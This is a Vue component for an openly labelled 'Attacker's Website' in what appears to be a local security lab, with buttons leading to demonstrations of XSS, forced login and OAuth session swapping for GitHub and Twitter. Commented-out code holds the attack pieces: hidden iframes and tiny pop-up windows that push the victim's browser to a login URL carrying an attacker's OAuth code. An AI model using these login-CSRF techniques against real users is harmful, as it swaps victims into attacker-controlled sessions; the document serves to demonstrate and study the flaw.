<template>
    <div class="dashboard">
      <h1>This is the Attacker's Website</h1>
      <h2> Dashboard</h2>
      <div class="flex-container"> 
        <div >
          <!-- <img src="@/assets/cat-cats.gif"> -->
          <br>
          <!-- <button type="button" ref="forceLoginBtn" @click="forceLogin()">
            <span>Download image/Force login</span>
          </button> -->
          <!-- <a :href="evil_link">visit website twitter</a> -->
        </div>
      </div>
      <!-- <iframe src="http://localhost:8080/login?code=4a0622b77c02948efe30&amp;login_method=githubLoginSF" style="width:100%;"> -->
      <!-- <iframe src="https://github.com/login/oauth/authorize?client_id=d83ac1ef7822f3087e4b&amp;redirect_uri=http://localhost:8080/login&amp;scope=user" style="width:100%;">
      </iframe> -->
  
      <!-- <iframe src="http://localhost:8080/login?code=4a0622b77c02948efe30&amp;login_method=githubLoginSF" style="width:100%;"> -->
      <!-- <iframe src="http://localhost:8080/login?code=e8af4442c23a9d8a92a6&amp;login_method=githubLoginSF" style="width:100%;" hidden>
      </iframe> -->
      <button type="button"  @click="router.push({name: 'xss'})">Demonstrate XSS</button>
      <br><br>
      <button type="button"  @click="pushForceLoginView()">Demonstrate Force Login</button>
      <br><br>
      <button type="button"  @click="pushSessionSwappingViewGithubSF()">Demonstrate Session Swapping Github SF</button>
      <br><br>
      <button type="button" @click="pushSessionSwappingViewTwitter()">Demonstrate Session Swapping Twitter</button>
      <br><br>
      <button type="button"  @click="pushAutoSessionSwappingGithub()">Demonstrate Session Swapping Github SF</button>
      <br><br>
    </div>
  </template>
  
  <script>
    import { defineComponent, ref } from 'vue';
    import { useRouter } from 'vue-router';
    // import axios from 'axios';
    require("@/assets/cat-cats.gif")
    export default defineComponent({
      mounted: function() {
        console.log(this.$refs.forceLoginBtn)
        // this.$refs.forceLoginBtn.click()
      },
      setup() {
        // const route = useRoute();
        const router = useRouter();
        const pushForceLoginView = ()=>{
          router.push({
            name: 'forcelogin',
            });
          };
        const pushSessionSwappingViewGithubSF = ()=>{
          router.push({
            name: 'sessionswapping_github_sf',
            });
          };
        
        const pushSessionSwappingViewTwitter = ()=>{
          router.push({
            name: 'sessionswapping_twitter',
            });
          };
          
          const pushAutoSessionSwappingGithub = ()=>{
          router.push({
            name: 'auto_sessionswaping_github',
            });
          };
        
        // const forceLogin = () => {
        //   console.log("forceLogin");
        //   var a = document.createElement('a');
        //   a.href = "../assets/cat-cats.gif";
        //   console.log(a.href)
        //   a.download = "../assets/cat-cats.gif";
        //   document.body.appendChild(a);
        //   a.click();
        //   document.body.removeChild(a);
        //   window.open('https://twitter.com/i/oauth2/authorize?response_type=code&client_id=UGxoMHJDc0JFcWNvMzkxeDZjMEk6MTpjaQ&redirect_uri=http%3A%2F%2Flocalhost%3A8080%2Flogin&state=state&code_challenge=challenge&code_challenge_method=plain&scope=users.read+tweet.write+tweet.read+follows.read+follows.write','windowname','width=1,height=1,left=5,top=3');
        //   var win = window.open('http://localhost:8080/twitter_login?state=state&code=YndBbFNPTXlUa1hiblprLVN0ZkFrMUVJV2pVM1d6UnFkbUVQOWt4cTc1WmExOjE2Nzg1Mzc2NDAzMTQ6MTowOmFjOjE','windowname','width=1,height=1,left=5,top=3');
        //   setTimeout(function() { win.close();}, 3000);
        // };
        const evil_link = ref('');
      //   const getCode = async () => {
      //   try {
      //     const resData = await axios.get('http://localhost:8083/oauthcode/get_code');
      //     console.log(resData)
      //     if (resData.status === 200) {
      //       const code = resData.data;
      //       evil_link.value = `http://localhost:8080/login?state=state&code=${code}&login_method=twitterLoginSF`
      //     } else {
      //       alert('Unknown Error Occurs');
      //     }
      //   } catch (error) {
      //     alert('Unknown Error Occurs');
      //   } finally {
      //     // Empty here
      //   }
      // };
      // getCode();
      return {
        router,
        evil_link,
        // forceLogin,
        pushForceLoginView,
        pushSessionSwappingViewGithubSF,
        pushSessionSwappingViewTwitter,
        pushAutoSessionSwappingGithub,
      };
      },
      
    });
    
  </script>
  
  <style>
    /* .flex-container {
      display: flex;
      background-color: DodgerBlue;
    }
    .flex-container > div {
      background-color: #f1f1f1;
      margin: 10px;
      padding: 20px;
      font-size: 30px;
    } */
  </style>
  